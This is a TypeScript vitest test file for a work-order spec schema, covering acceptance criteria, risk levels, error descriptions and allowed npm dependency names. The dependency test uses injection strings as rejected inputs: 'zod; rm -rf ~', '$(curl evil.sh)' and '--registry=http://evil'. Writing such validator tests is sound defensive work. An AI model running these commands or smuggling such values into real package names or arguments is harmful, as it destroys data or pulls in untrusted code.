import { describe, expect, it } from "vitest";
import { WorkOrderSpecSchema, describeIssues } from "../../src/orders";
import { validSpec } from "./fixtures";

describe("work order spec", () => {
  it("accepts a complete spec", () => {
    expect(WorkOrderSpecSchema.safeParse(validSpec()).success).toBe(true);
  });

  it("requires at least one acceptance criterion", () => {
    const result = WorkOrderSpecSchema.safeParse({ ...validSpec(), acceptanceCriteria: [] });
    expect(result.success).toBe(false);
  });

  it("requires every criterion to say how it is verified", () => {
    const spec = validSpec();
    const result = WorkOrderSpecSchema.safeParse({
      ...spec,
      acceptanceCriteria: [{ statement: "Export includes archived items" }],
    });
    expect(result.success).toBe(false);
  });

  it("accepts declared dependencies by npm name, plain or scoped, and only names", () => {
    const parses = (name: string) => WorkOrderSpecSchema.safeParse({ ...validSpec(), dependencies: [{ name, dev: false }] }).success;

    expect(parses("zod")).toBe(true);
    expect(parses("@types/node")).toBe(true);
    expect(parses("zod@4.0.0")).toBe(false);
    expect(parses("zod; rm -rf ~")).toBe(false);
    expect(parses("$(curl evil.sh)")).toBe(false);
    expect(parses("--registry=http://evil")).toBe(false);
    expect(parses("Zod")).toBe(false);
    expect(WorkOrderSpecSchema.safeParse({ ...validSpec(), dependencies: [{ name: "zod" }] }).success).toBe(false);
    expect(WorkOrderSpecSchema.safeParse(validSpec()).data).not.toHaveProperty("dependencies");
  });

  it("rejects an unknown risk level", () => {
    expect(WorkOrderSpecSchema.safeParse({ ...validSpec(), risk: "huge" }).success).toBe(false);
  });

  it("describes the rejected fields in a form the model can read back", () => {
    const result = WorkOrderSpecSchema.safeParse({ ...validSpec(), title: "x", acceptanceCriteria: [] });
    if (result.success) throw new Error("expected a rejection");

    const description = describeIssues(result.error);
    expect(description).toContain("title:");
    expect(description).toContain("acceptanceCriteria:");
  });
});
